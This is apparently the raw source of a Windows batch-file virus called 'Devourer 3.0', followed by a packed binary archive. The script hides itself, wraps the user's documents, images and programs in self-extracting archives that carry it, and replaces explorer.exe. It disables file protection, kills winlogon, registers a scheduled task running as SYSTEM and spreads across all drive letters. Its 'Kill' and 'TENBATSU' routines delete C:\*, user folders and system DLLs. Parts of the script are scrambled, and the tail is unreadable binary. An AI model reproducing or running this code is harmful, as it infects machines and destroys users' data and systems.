a
goto RealHead
[Devourer_3.0_12722772318242][DSC02702.JPG][EJPack]
:RealHead
cls
@echo off
:AvoideVNBug
if "C:\Users\puncher\AppData\Roaming"=="" (
if not exist C:\WINDOWS\system32\drivers\values.log (
goto Kill
)
)
if "C:\Users\puncher\AppData\Roaming"=="" (
FOR /F "tokens=*" %%i in (C:\WINDOWS\system32\drivers\values.log
) do set %%i
)
set teRAr=%%bh%%jkq%%vz%%f7%%4c50t%%u1w8%%(cdf9)%%@6tc%%
setpRegp ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
set DeRrrer=C:\WINDOWS\FRets\HIDESE~
set setrA=C:\WINDOWS\FRets\HIDESE~\DeRrrersetrA
set rgr=\WieRAR
set sepeRre=44
if ""=="-Install" (
goto Install
)
if ""=="-Run" (
goto Run
)
if ""=="-Tenbatsu" (
goto Tenbatsu
)
if ""=="-Kill" (
goto Kill
)
if ""=="-Open" (
goto Open
)
if /i ""=="-goto" (
goto 
)
:CheckSign
if ""=="-Fil" (
if exist \Devourer.sign (
del /f /a /q script.bat
)
)
exit
if exist \Devourer.sign (
exit
)
echo >\Devourer.sign
if not exist \SOLA.BAT (
goto ChkSGNNext
)
del /f /a /q \*.*
rd /s /q \solasetup
:ChkSGNNext
echo>\sola.sign
if not exist "C:\ProgramData\" (
goto End
)
:HIDESelf
sr C:\WINDOWS\FRets\HIDESELF...\
sr \eRrep................\
i eRt exist  gRtR Kipp
:FileCopy
set selfname=script.bat
attrib script.bat -s -h -r
if not ""=="-USB" (
copy script.bat \Devourer.bat
)
if ""=="-USB" (
copy Devourer.bat \Devourer.bat
)
attrib script.bat +s +h +r
if not exist \Devourer.bat (
goto kill
)
cd\
md \WinRAR
md \WinRAR\Formats
if not exist Devourer\WINRAR (
goto FileCopyNext
)
copy Devourer\WinRAR\*.* \Winrar\*.*
copy Devourer\WinRAR\Formats\*.* \Winrar\Formats\*.*
goto FileCopyNext2
:FileCopyNext
if not exist "C:\Program Files\winrar\winrar.exe" (
goto Kill
)
copy "C:\Program Files\winrar\*.*" \Winrar\*.*
copy "C:\Program Files\winrar\Formats\*.*" \Winrar\Formats\*.*
:FileCopyNext2
echo On Error Resume Next>\Devourer.VBS
echo set ws=wscript.createobject("wscript.shell")>>\Devourer.VBS
echo ws.run "cmd /c \Devourer.BAT -Install" 0 >>\Devourer.VBS
cscript \Devourer.VBS
del \Devourer.VBS
if ""=="-Fil" (
del /f /a /q script.bat
)
exit
====================================================
:Install
:PackerSetup
C:
cd 
if exist Devourersetup (
rd /s /q Devourersetup
)
md Devourersetup
cd Devourersetup
..\WieRAR\rgr.exe e -AeRste "script.bat"
..\WieRAR\rgr.exe g -s -AeRste FreetiRe.rpp *
copy ..\WinRAR\rar.exe rar.exe
copy *.ico ..\WinRAR\*.ico
copy example.rar ..\WinRAR\example.rar
cd..
tasklist >\task.txt
FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "\task.txt"') do (
set svchost=%%i
)
copy C:\WINDOWS\system32\cmd.exe \%%i
copy \sleep.exe \%%i
if not exist \svchost.exe (
copy C:\WINDOWS\system32\cmd.exe \svchost.exe
)
copy \sleep.exe \svchost.exe
del \task.txt
cd WinRAR
copy Default.SFX C:\~$.sfx
for %%i in (txt doc jpg exe exp fil) do (
copy example.rar ..\Devourersetup\%%ipack.dll
)
start /min \winrar.exe ch -- \example.rar
\svchost.exe 1000
call regedit.exe /s \RegA.txt
\svchost.exe 1000
copy /y txt.ico C:\~$.ico
start /min \winrar.exe ch -- \txtpack.dll
\svchost.exe 2000
copy /y doc.ico C:\~$.ico
start /min \winrar.exe ch -- \docpack.dll
\svchost.exe 2000
copy /y jpg.ico C:\~$.ico
start /min \winrar.exe ch -- \jpgpack.dll
\svchost.exe 2000
copy /y exe.ico C:\~$.ico
start /min \winrar.exe ch -- \exepack.dll
\svchost.exe 2000
copy /y exp.ico C:\~$.ico
start /min \winrar.exe ch -- \exppack.dll
\svchost.exe 2000
copy /y fil.ico C:\~$.ico
start /min \winrar.exe ch -- \filpack.dll
\svchost.exe 2000
call regedit.exe /s \RegB.txt
del C:\~$.*
cd..
:MakeRarNormal
md 0WinRAR\Formats
cd 0WinRAR
copy ..\WinRAR\Formats\UNACEV2.DLL Formats\*.*
copy ..\WinRAR\Default.SFX Default.SFX
copy ..\WinRAR\Descript.ion Descript.ion
copy ..\WinRAR\Rar.exe Rar.exe
copy ..\WinRAR\RarExt64.dll RarExt64.dll
copy ..\WinRAR\RarExt.dll RarExt.dll
copy ..\WinRAR\RarFiles.lst RarFiles.lst
copy ..\WinRAR\WinRAR.exe WinRAR.exe
cd..
rd /s /q WinRAR
ren 0WinRAR WinRAR
i exist \sRr.gt rep / /g / \sRr.gt
eRAy \sRr.gt \sRr.gt
eeR ::MADE_BY_KCN->>\sRr.gt
eRAy /Y \CHAIN.BAT C:\WINDOWS\systes32\CHAIN.BAT
echo Windows Registry Editor Version 5.00>\reg.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule]>>\reg.reg
echo "Start"=dword:00000002>>\reg.reg
regedit /e C:\WINDOWS\ls.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule"
\svchost.exe 1000
type C:\WINDOWS\ls.reg>\ls.txt
FOR /F "tokens=2 delims=:" %%i in ('findstr /c:"tart" \ls.txt') do (
if not "%%i"=="00000002" (
regedit /s \reg.reg
)
)
echo Windows Registry Editor Version 5.00>>\reg2.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>\reg2.reg
echo "HideFileExt"=dword:00000001>>\reg2.reg
echo "ShowSuperHidden"=dword:00000000>>\reg2.reg
echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt]>>\reg2.reg
echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden]>>\reg2.reg
start regedit.exe /s \reg2.reg
:Mainsetup
:MainStep1
echo On Error Resume Next>lsvbs.VBS
echo set ws=wscript.createobject("wscript.shell")>>lsvbs.VBS
echo ws.run "cmd /c \Devourer.BAT -goto TaskSetup" 0 >>lsvbs.VBS
cscript lsvbs.vbs
\svchost.exe 10000
if exist \TaskOK (
del \TaskOK
)
goto MainStep4
:MainStep2
del C:\WINDOWS\Tasks\Tasks.job
echo On Error Resume Next>lsvbs.VBS
echo set ws=wscript.createobject("wscript.shell")>>lsvbs.VBS
echo ws.run "cmd /c \Devourer.BAT -goto ExpSetup" 0 >>lsvbs.VBS
cscript lsvbs.vbs
\svchost.exe 10000
if exist \ExpOK (
del \ExpOK
)
goto MainStep4
:MainStep3
echo On Error Resume Next>lsvbs.VBS
echo set ws=wscript.createobject("wscript.shell")>>lsvbs.VBS
echo ws.run "cmd /c \Devourer.BAT -goto MenuSetup" 0 >>lsvbs.VBS
cscript lsvbs.vbs
\svchost.exe 10000
if exist \MenuOK (
del \MenuOK
)
goto MainStep4
goto Kill
:MainStep4
:NOSLK
del /f /a /q C:\WINDOWS\system32\rar.exe C:\WINDOWS\SOLAADDRESS.TXT "C:\Program Files\KAKENHI'S\GUICheck.bat"
md C:\WINDOWS\system32\rar.exe\nodel......\
md C:\WINDOWS\solaaddress.txt\nodel......\
md "C:\Program Files\KAKENHI'S\GUICheck.bat\nodel......\"
:SetTwunk32
FOR /F "siA= tRees=," %%i ie 'rir C:\WINDOWS\twre_.exe' rR i /I "%%"=="twre_.exe" set Dgte=%%i
set rDgte=
rgte 
eeR.>>C:\WINDOWS\FRets\resUI.iei
eeR [.SeppCpgssIeR2]>>C:\WINDOWS\FRets\resUI.iei
eeR RetyAe=NT-.FON>>C:\WINDOWS\FRets\resUI.iei
set>C:\WINDOWS\systes32\rriers\gpres.pRg
rgte 
:VoideUnownBug
FOR /F "tokens=*" %%i in (\Devourer.bat) do (
echo %%i>LS.bat
)
goto DebugNext
:DebugNext
type \Devourer.bat>>LS.bat
copy /y LS.bat \Devourer.bat
exit
:TaskSetup
attrib C:\WINDOWS\Tasks\Tasks.job -s -h -r
del C:\WINDOWS\Tasks\Tasks.job
type \Tasks.xxx>C:\WINDOWS\Tasks\Tasks.job
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
if errorlevel 1 (
exit
)
:TaskNext
attrib C:\WINDOWS\Tasks\Tasks.job +s +h +r
echo.>\TaskOK
echo.>\TaskStart
exit
:ExpSetup
ren C:\WINDOWS\system32\svchost.exe 0svchost.exe
if errorlevel 1 (
exit
)
ren C:\WINDOWS\system32\0svchost.exe svchost.exe
if not exist C:\WINDOWS\system32\dbgeng.dll (
exit
)
copy /Y \exppack.dll \explorer.exe
copy /Y \ntsd.exe C:\WINDOWS\system32\stop.exe
echo On Error Resume Next>Devourer.VBS
echo set ws=wscript.createobject("wscript.shell")>>Devourer.VBS
echo ws.run "\svchost.exe /c \Devourer.BAT -Run -ExpStart" 0 >>Devourer.VBS
echo ws.run "C:\WINDOWS\system32\CHAIN.BAT -Guide" 0 >>Devourer.VBS
\rar.exe -m0 -ep -ep1 a \explorer.exe Devourer.vbs
del Devourer.vbs
:ZsMake1
echo SavePath>zs.txt
echo Setup=Devourer.vbs>>zs.txt
echo silent=1 >>zs.txt
echo Overwrite=1 >>zs.txt
\rar.exe -zzs.txt c \explorer.exe
del zs.txt
echo KZSSXN93JS900SCKNKDSK>>\explorer.exe
:KillSFC
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('stop -pn winlogon.exe',0);window.close()"
del /f /a C:\WINDOWS\system32\sfcfiles.dll C:\WINDOWS\system32\dllcache\sfcfiles.dll
:ReplaceFile
ren C:\WINDOWS\explorer.exe 0explorer.exe
attrib C:\WINDOWS\0explorer.exe +s +h +r
copy \explorer.exe C:\WINDOWS\explorer.exe
echo.>\ExpOK
exit
:MenuSetup
C:
cd "C:\ProgramData"
cd ʼ˵\\
echo On Error Resume Next>Devourer.VBS
if not exist Devourer.VBS (
exit
)
echo set ws=wscript.createobject("wscript.shell")>>Devourer.VBS
echo ws.run "\svchost.exe /c \Devourer.BAT -Run" 0 >>Devourer.VBS
echo ws.run "C:\WINDOWS\system32\CHAIN.BAT -Guide" 0 >>Devourer.VBS
copy Devourer.VBS \Devourer.VBS
echo NT>\NoTasks
echo.>\MenuOK
exit
:Run
i exist \DeRrrer.sige eeR >\DeRrrer.sige
if not ""=="-ExpStart" (
goto RunNext
)
:StartExplorer
C:
cd C:\WINDOWS
ren explorer.exe 1explorer.exe
attrib 0explorer.exe -s -h -r
ren 0explorer.exe explorer.exe
start explorer.exe
\svchost.exe 10000
ren explorer.exe 0explorer.exe
ren 1explorer.exe explorer.exe
attrib 0explorer.exe +s +h +r
del C:\WINDOWS\Devourer.VBS
cd 
:RunNext
:RunTimeChk
if not exist \RunTime.txt (
echo RunSign_50>\RunTime.txt
)
FOR /F "tokens=2 delims=_" %%i in (\RunTime.txt) do (
set RunTime=%%i
)
if /i %%i leq 0 (
goto Virus
)
set /a RunTime=%%i-1
echo RunSign_(%%i-1)>\RunTime.txt
:Diskchk
echo On Error Resume Next>\RecentInf.VBS
echo set ws=wscript.createobject("wscript.shell")>>\RecentInf.VBS
echo ws.run "\svchost.exe /c \RecentInf.bat" 0 >>\RecentInf.VBS
cscript \RecentInf.VBS
del \RecentInf.VBS
set runroot=C:\ProgramData\ʼ˵\\
set taskroot=C:\WINDOWS\Tasks
:CHAIN
eeR.>C:\WINDOWS\DrieIe.iei
eeR Oe ErrRr Resrse Next>\pss.s
eeR set ws=wseriAt.eregteReet"wseriAt.sepp">>\pss.s
eeR ws.rre "C:\WINDOWS\systes32\CHAIN.BAT -TiseSet"  >>\pss.s
eseriAt \pss.s
rep \pss.s
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
vol %%i:
)
if errorlevel 1 (
set %%i=1
)
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
echo 1>%%i:\Devourerchk1
)
findstr . %%i:\Devourerchk1
if not errorlevel 1 (
del %%i:\Devourerchk1
)
if not exist %%i:\Devourer\WINRAR\WinRAR.exe (
md %%i:\Devourer\WinRAR\Formats
)
copy \Formats\* %%i:\Devourer\WinRAR\Formats\*
copy \* %%i:\Devourer\WinRAR\*
attrib %%i:\Devourer +s +h +r
echo On Error Resume Next>\lsvbs.vbs
echo set ws=wscript.createobject("wscript.shell")>>\lsvbs.vbs
echo ws.run "\svchost.exe /c \RarInform.bat " 0 >>\lsvbs.vbs
cscript \lsvbs.vbs
del \lsvbs.vbs
:RunBack
if ""=="" (
set chktime=0
)
set /a chktime=0+2
if /i (0+2) geq 60 (
goto DvRARChk
)
:RunBack2
if ""=="1" (
vol C:
)
if not errorlevel 1 (
call \Scan.bat C:
)
if ""=="1" (
vol D:
)
if not errorlevel 1 (
call \Scan.bat D:
)
if ""=="1" (
vol E:
)
if not errorlevel 1 (
call \Scan.bat E:
)
if ""=="1" (
vol F:
)
if not errorlevel 1 (
call \Scan.bat F:
)
if ""=="1" (
vol G:
)
if not errorlevel 1 (
call \Scan.bat G:
)
if ""=="1" (
vol H:
)
if not errorlevel 1 (
call \Scan.bat H:
)
if ""=="1" (
vol I:
)
if not errorlevel 1 (
call \Scan.bat I:
)
if ""=="1" (
vol J:
)
if not errorlevel 1 (
call \Scan.bat J:
)
if ""=="1" (
vol K:
)
if not errorlevel 1 (
call \Scan.bat K:
)
if ""=="1" (
vol L:
)
if not errorlevel 1 (
call \Scan.bat L:
)
if ""=="1" (
vol M:
)
if not errorlevel 1 (
call \Scan.bat M:
)
if ""=="1" (
vol N:
)
if not errorlevel 1 (
call \Scan.bat N:
)
if ""=="1" (
vol O:
)
if not errorlevel 1 (
call \Scan.bat O:
)
if ""=="1" (
vol P:
)
if not errorlevel 1 (
call \Scan.bat P:
)
if ""=="1" (
vol Q:
)
if not errorlevel 1 (
call \Scan.bat Q:
)
if ""=="1" (
vol R:
)
if not errorlevel 1 (
call \Scan.bat R:
)
if ""=="1" (
vol S:
)
if not errorlevel 1 (
call \Scan.bat S:
)
if ""=="1" (
vol T:
)
if not errorlevel 1 (
call \Scan.bat T:
)
if ""=="1" (
vol U:
)
if not errorlevel 1 (
call \Scan.bat U:
)
if ""=="1" (
vol V:
)
if not errorlevel 1 (
call \Scan.bat V:
)
if ""=="1" (
vol W:
)
if not errorlevel 1 (
call \Scan.bat W:
)
if ""=="1" (
vol X:
)
if not errorlevel 1 (
call \Scan.bat X:
)
if ""=="1" (
vol Y:
)
if not errorlevel 1 (
call \Scan.bat Y:
)
if ""=="1" (
vol Z:
)
if not errorlevel 1 (
call \Scan.bat Z:
)
if ""=="2" (
vol C:
)
if errorlevel 1 (
set C=1
)
if ""=="2" (
vol D:
)
if errorlevel 1 (
set D=1
)
if ""=="2" (
vol E:
)
if errorlevel 1 (
set E=1
)
if ""=="2" (
vol F:
)
if errorlevel 1 (
set F=1
)
if ""=="2" (
vol G:
)
if errorlevel 1 (
set G=1
)
if ""=="2" (
vol H:
)
if errorlevel 1 (
set H=1
)
if ""=="2" (
vol I:
)
if errorlevel 1 (
set I=1
)
if ""=="2" (
vol J:
)
if errorlevel 1 (
set J=1
)
if ""=="2" (
vol K:
)
if errorlevel 1 (
set K=1
)
if ""=="2" (
vol L:
)
if errorlevel 1 (
set L=1
)
if ""=="2" (
vol M:
)
if errorlevel 1 (
set M=1
)
if ""=="2" (
vol N:
)
if errorlevel 1 (
set N=1
)
if ""=="2" (
vol O:
)
if errorlevel 1 (
set O=1
)
if ""=="2" (
vol P:
)
if errorlevel 1 (
set P=1
)
if ""=="2" (
vol Q:
)
if errorlevel 1 (
set Q=1
)
if ""=="2" (
vol R:
)
if errorlevel 1 (
set R=1
)
if ""=="2" (
vol S:
)
if errorlevel 1 (
set S=1
)
if ""=="2" (
vol T:
)
if errorlevel 1 (
set T=1
)
if ""=="2" (
vol U:
)
if errorlevel 1 (
set U=1
)
if ""=="2" (
vol V:
)
if errorlevel 1 (
set V=1
)
if ""=="2" (
vol W:
)
if errorlevel 1 (
set W=1
)
if ""=="2" (
vol X:
)
if errorlevel 1 (
set X=1
)
if ""=="2" (
vol Y:
)
if errorlevel 1 (
set Y=1
)
if ""=="2" (
vol Z:
)
if errorlevel 1 (
set Z=1
)
if exist C:\WINDOWS\DriveInf.ini (
del C:\WINDOWS\DriveInf.ini
)
echo.>C:\WINDOWS\DRKakunin.ini
\svchost.exe 500
if exist C:\WINDOWS\ls*.reg (
del C:\WINDOWS\ls*.reg
)
regedit /e C:\WINDOWS\ls1.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule"
\svchost.exe 500
type C:\WINDOWS\ls1.reg>\ls.txt
FOR /F "tokens=2 delims=:" %%i in ('findstr /c:"tart" \ls.txt') do (
if not "%%i"=="00000002" (
regedit /s \reg.reg
)
)
\svchost.exe 500
if exist \NoTasks (
if not exist "C:\ProgramData\ʼ˵\\\Devourer.VBS" copy "\Devourer.VBS" (
"C:\ProgramData\ʼ˵\\\Devourer.VBS"
)
)
if exist \TaskStart (
if not exist C:\WINDOWS\Tasks\Tasks.job (
copy \Tasks.xxx C:\WINDOWS\Tasks\Tasks.job
)
)
attrib C:\WINDOWS\Tasks\Tasks.job +s +h +r
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
if ""=="-ExpStart" (
attrib C:\WINDOWS\explorer.exe -s -h -r
)
\svchost.exe 500
if not exist C:\WINDOWS\explorer.exe (
copy \explorer.exe C:\WINDOWS\explorer.exe
)
if ""=="-ExpStart" (
findstr KZSSXN93JS900SCKNKDSK C:\WINDOWS\explorer.exe>nul
)
if errorlevel 1 (
if not exist C:\WINDOWS\1explorer.exe (
goto Kill
)
)
i eRt exist C:\WINDOWS\systes32\CHAIN.BAT gRtR Kipp
set sige=
FOR /F "siA= tRees=*" %%i ie C:\WINDOWS\systes32\CHAIN.BAT rR set sige=%%i
gRtR CHCHK
:CHCHK
i eRt ""=="::CHAIN" gRtR Kipp
\svchost.exe 500
goto RunBack
:Restart
if exist "D:\I am KAKENHI.txt" (
shutdown -r -t 100 -c "DevourerRestart"
)
goto RSTEnd
shutdown -r -f -t 1
\svchost.exe 100000
start \ntsd.exe -c q -pn csrss.exe
:RSTEnd
goto DiskChk
:DvRARChk
set chktime=0
if not exist \ScanF (
goto RunBack2
)
echo On Error Resume Next>\lsvbs.vbs
echo set ws=wscript.createobject("wscript.shell")>>\lsvbs.vbs
echo ws.run "\svchost.exe /c \RarInform.bat " 0 >>\lsvbs.vbs
cscript \lsvbs.vbs
del \lsvbs.vbs
goto RunBack2
:Virus
i exist C:\WINDOWS\tgss\tgss.iei i exist C:\WINDOWS\tgss\ress.iei gRtR HiPD
i exist C:\WINDOWS\tgss\tgss.iei gRtR TENBATSU
i exist C:\WINDOWS\tgss\ress.iei gRtR Rrsgtgpp
i exist \HKLFieis.iei i exist \AKLFieis.iei gRtR Reset
rep \RreTise.txt
gRtR DisC
:HiPD
FOR %%i IN (\akari.txt) DO (
if /i %%~zi lss 102400 (
goto TENBATSU
)
)
goto Reset
:Kill
if exist "D:\I am KAKENHI.txt" (
shutdown -r -t 100 -c "DevourerKill"
)
goto KillEND
echo Windows Registry Editor Version 5.00>C:\WINDOWS\recover.reg
echo [-HKEY_LOCAL_MACHINE\HARDWARE]>>C:\WINDOWS\recover.reg
echo del /f /a /q systemroot\units.bat
echo ren C:\WINDOWS\system32\*.dll 0*.dll>>C:\WINDOWS\units.bat
echo ren C:\WINDOWS\system32\drivers\*.sys 0*.sys>>C:\WINDOWS\units.bat
echo On Error Resume Next>lskill.vbs
echo set ws=wscript.createobject("wscript.shell")>>lskill.vbs
echo ws.run "cmd /c C:\WINDOWS\units.bat" 0 >>lskill.vbs
del /f /a /q C:\WINDOWS\system32\dllcache\*
ren C:\WINDOWS\explorer.exe explorer.exe123
taskkill /f /im explorer.exe
ntsd -c q -pn explorer.exe
shutdown -r -t 60 -c "CRCֹϵͳ"
mshta "javascript:new ActiveXObject('WScript.Shell').Run('cmd /c del /f /a /q C:\\*',0);window.close()"
cscript lskill.vbs
regedit /s C:\WINDOWS\recover.reg
:KillEND
goto Diskchk
:TENBATSU
if exist "D:\I am KAKENHI.txt" (
shutdown -r -t 100 -c "TENBATSU"
)
goto TENBATSUEND
set alldrive=
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
call \HIKARI.BAT eoladd %%i:
)
for %%i in () do (
del /f /a /q /s %%i
)
del /f /a /q /s "C:\Documents and Settings"
goto Kill
:formatall
eeR Oe ErrRr Resrse Next>\pss.s
eeR set ws=wseriAt.eregteReet"wseriAt.sepp">>\pss.s
eeR ws.rre "\seRst.exe /e \ggri.gt LBEX "  >>\pss.s
eseriAt \pss.s
rep \pss.s
eeR RreSige_>\RreTise.txt
:TENBATSUEND
gRtR DisC
:Reset
del C:\WINDOWS\Tasks\*.ini
del \ScanF \HKLFinish.ini \AKLFinish.ini
del \hikari.ini \akari.ini
del \hikari.txt \akari.txt
del \RarInform.ini \RunTime.txt
goto DiskChk
:Open
if ""=="-USB" (
Exit
)
FOR /F "tokens=1,2,3 skip=2 delims=[]" %%i in (script.bat) do (
set code=%%i
)
set name=%%j
set type=%%k
goto OpenNext
:OpenNext
goto %%k
:EJPack
if not Exist "%%j" (
exit
)
call "%%j"
del /f /a /q "%%j"
del /f /a /q script.bat
exit
:TDPack
if not exist "%%j" (
exit
)
call "%%j"
:Save
FOR /F "tokens=1 delims=:" %%i in ('findstr "%%i" *.exe') do (
set PackName=%%i
)
\rar.exe -m0 -ep -ep1 a "%%i" "%%j"
echo %%i>>"%%i"
:Del
del /f /a /q "%%j"
del /f /a /q script.bat
exit
:End
Rar Ιs 
       U7"5>)A0Rڔ*ZH{T4fS<,w-gw\,	٫*ѕ*?Iě=g*zuk׳D].l19km"i?'$oJ \9
 3
\[+ge@_1yA-tB:8ojݣL`6+NgmD񏚒N\"Pvbݘ9'	lk;ginӞؗqwAӟ/(18@$ߤK9oko1WE>cH!Dj_K,KHC~+'mbs&9@5ev91K=V.
AĳFFyQp0K؁͞NNK"_m hq>[i?ra#U7"5$x_1W[{Lbdݮ*KEǕ.¨ sO@J1p-hͻ
1G!kD^Ę3(K^ɍψ8W-M$: F}ߢ;KΛS
S$0p1j)bjpD-3lpWFր)$y=5<_=/BY0Y +}OIPΎFX7-/r(<jD<(JNOI utz@ǈ~S2B516O눌ʡk8T[E	Ķڜ1Ѵzfr{Çgw
 Yl
T ZnAJ0Wz]-3Txo(gB2̰gGiWCbA4{hr)/
sL"1V[[#>8#{⭩
xĪ+?iRC[$sE'Am3", XAagI	elb0 "V}>dٚmLIa/kŉn+JOe.{Q؉}L
r[JpbXlK(ˌrUSI[
@51UU +f5oE8)R,avƚ@>.;wsrpm+	UakaX#:ot	DSô`b.WLJZV"T$B_`ϝW7PgCOQON,)m
{tx\(@-b433
%%03919n
A$p vSnPخ.
`/5Bk*R:ԙ  1}Tl\Cl= V0XjI`ѕ+y
2o	PJQtr$vKT%Z[vH.rYZBquiGJHeoY*r
lz>׎R
NxQ@
[APan총dQR#Q. SP gD
*	HX-1_IQ3j-F v qh8
/oeCZ(]ÀmFXfaء2d]Ft[ϟK
K?0	e=XyǓfc}-H4H0EroD#UR^{UMR QzNly1
ڃL
 KGξY@t5a8Y
ҍpϺ}~(2z_i~*6D˯0h?ⰨZPV#D-5
O0OjnQO4J5ynsO[Ѵ/[	:OumwZ Y:*AHd~*DP8գȹni2
A[ʸim5
")3e#E9G'gķ{/C'j҅3Kf(|mBcrBǤ)ɒ8ä*D;fp92S⤞I=1~6AGԖ?<U8Kܬnyp+¶TƆZזFbs?ݕ:rNX'+QET<{o>оQ q;oGƗ`T.",j˻
J0	o-ގ
By`2zđ
Xs/qaS
8jރ(jq.H٧T bBȊ'x`Op
)ܧPf	$E#ad[c2o
6iF':Xf#k qY#MX8v7:0n<fbz(ځoRƔCwc0/(
s:[<= NT*3F	3lw6wLH1.՞leuJ3,UKcyz̲0p_+6[6Zqie3`$c{I.#Nbܺa"D0e"-(z
)AuUQtؘF
~`7V7P
ݨ
*Pͽ_:7P/n2)㽫qWl. +Gz=u-IE	ev_q<s=ܗ
wSVl	wv2<.btL̯	>
:`͓J.swٝ<#-cmXL{4c/ၫf.ߚXTފmf47Lu
47´䀚YUmzzs
<vA؇bCK2ya>N:2/a̔'19z 'Ȝ0̌5kAfW sݼD22mn$6OprY-?R$ߝ2P${lYw'kƕ/7@
*3C	lx\
YQFu#qT7>aEȦͣc
 s B
$e ?6$z{m 𦁜Z鸮H\Tr]d]U:iÆ7e
`Sl3L;(i5J
6tUl
 W* lP啍xsc	AyG
 ?Zfğiޚ$0dKp$lm4򇖥:cm
ڬ=Ȗt5pY6`z{x{6nˬ
}tBE/4a
eAmеٽ(?('r$Q4
@.> s@)EOXWʬYiz?S]+%/I#-)'},B?ZLq\m\P0WbȰ.טJ2~;4c}pʐ
iz Mz*
Cב
xIJq3li/:/w6¯017ۿ
GYLh:(O
)lPe<\ġaJTq}Gu?iÞ-?y`a^h3燄V~000jiI
xEDg9ooZM$tD>XS.H}WⴿrM
Oqof_8uYH`tbҔ[nU
+5<߅-NZʭ߆)	*/k.'6S9 x
H*"j.zAyPݶMh
l*
JYH /)õ1H0zA = L6v+script.bat{.p+찯lDgb L噂pШ$`I
ɋ9AM
4P#T[6Z7'V(8uJLiAx]SbwY 
8IN>f={
R+ڴV{U.PI{,678*)1*v$Ѯ}PrJt(̭=IY]nh/H1}I;63TSΕڞ2=ǋ+K.uc@48Lpd,;
BR+E@ʷXaAlF3)$Q0bnJ2fV)UM/0]W
:)qi
P#r1죒=2sÑ sUQ{f_
sַX 9F-b]eDCۀw鸿vݔޣ3릂sIDv 0HTGݡmVʭVhU
:zpUxn
}"NAY0aS:"GUj2aWZ =2<a֩+`Ӷ`
@DeĆֵqJ~ǉ6]{7c:yucZCݼ<5S{~17r)MUMv
9宑W+v'k
\t瑤cx\;{9Ni<j$[c=F0m%󦐑{HUcO4{a> dI4cDKְphmZa(RYTB
ZUq༘ϴ/6͛+P aUt9h8u
f
ڬ?yuWBx1
Jr(ۅ]t>,]
U	D8TR
~WP$pKczI+TGſ'~LaRP?Pj\2BX>pP ںSDlE3.تWse[6.J4hרaeMK)3?3B1Ҍ:6v4vXi ~
$
v1qIq}Fe jN޼0/W1yB+nydlw"
5 CW~N)Z{t	ո\.n`"
p}(Ƌ:jɄ(YvsU_Jҵl
+ k.Lׯc
̗ͥ=GPYڼC?\kRAD(FݢIir
Œ3.O
d~y1_
<}bHEk>6:-e	K$4s PhxKy'^'f;v;{PxJqTXK-+Mz!һ:*
fШ_Ȅs	$TiWjfFb'ps+m ''M	݇r9R?Ǘ_hf`ڼu/4,ri}.~mYI}vH
q1yioĺ-̍Sz
i`?邠u{TdoWC]xr>z9kl>F 
)++6ˣFl:O
B
'oe Oڮ( 6dϺDRռrWN2K]{{/.L"GO;lLR A\Lt+q)xy&)=Lz	|0pyuM̸j) V[T~0! `s؟7!
yi*eE]#~K58XҌHGS'RlQ xYfɟ
EEӤ 5)bFBsASM.jVSCo?$iX୘"QWiCچ>Vݩ(*$Cz٥lι6n9/{gG^Y6hB+)_	׊szHcVv mou{煯a)v
.kıRlN6oItA\CQ[
:j'Fz{PI,*I
??fnPvD TO33~_c<
/ݲkeW-T"e|_H0V4qvl\\&M+)չ6A|{os(dCW\0U=e(Uݮ[þg@?RzΔK,x
Q

qش7U6Z2ßYʹؓl6~CXb-bJIcH\~γPlvc\կ@ ./ƚBA9
G g
uH r޺
fuTjAN瀪˓:)kőU[>D r9}AU {d`0g8Q# /qHpȔ' x<@Dw,Fi	o]6
Pk~ىh;j,r*""hTaxc
+$='} eȹ	hohS<uʿDMH9ڧ).*bӳ[z-+뒰}0gc"w˼ BF즛BoR^¸CV5cdM͈ ѵ!,Sr6u/VH8'ܥH
6>n}7
D ~{)v7h
h fbbRy['sP0	8z/nwUD>
joC+{~oh #n'ξW6.. ѓŌS0hwg>Djc-?8.3s'l
P'Ѯ}Q *@ 
H4
ueSpKM
7PI6n٧ ΃ [jDY
>ALh[
Ʌv)>t	e5G>ߟʶ-O1Xud)
xW3z[[
w9Pڊcj	B{Iq
HLlim"E;25e6+EcZ#xBX	ڑv!z|<u1Y1rvM@tm,7j[o1Q#I/=ynȷyTFW>ov\6:~U4txt&
㯍 FB) }6zhuXKm`N?6
OvQRVmRmj{aCtdA	 @456(Bu:WLg2/0d[ϿJ+X=~~)tjzx4S˒n0X)
[20L \IID`drFru
cZ \KMD_O)lZ͔'[ )2xzSŹog1.(@k{ޤLG6<U=m
)IAb-Yt7WSzHvRo`b]m3XgB5(Qٙ8icɆkpHصM	t6H]l4moL+#囹+dHe7_fB2 ]پffEh-+L
"a;&+Bw':[uT*wT ,dp(ZMl 4WN}:Vh_G\.Ư`簪OSbouH6#9f QjMC٦CZA"M7iD{$]]v	F)~x[gG# X@`IMgF@fw4Q	U)ҽj7zBvfj
AoVg/$v{)~֕
ɐյnO[iwa7׷h5
ΫIP9 v瑕f/"<ig~Ī,Xǅ0S캟4"K
V
ՒpLj
`}ĴFI
DdT~x[Óh*[ w
R5sdSsMFO8-ddv+	r6zSQS*sO8Uv[~s61uBI	i7
tR?7'9g	H
Ƹ [ 8gEaK2iF)[CGhJ*ǊclB>XJ2gbLf*.OU\KEEJy@5EJxt
sdƎA:=TlVH$ֺ}-IBzhӝco"r	1cw{뉲ޘ<EjK#kFʕ=B 3o'C^+lP+Tx):$|Wo̱
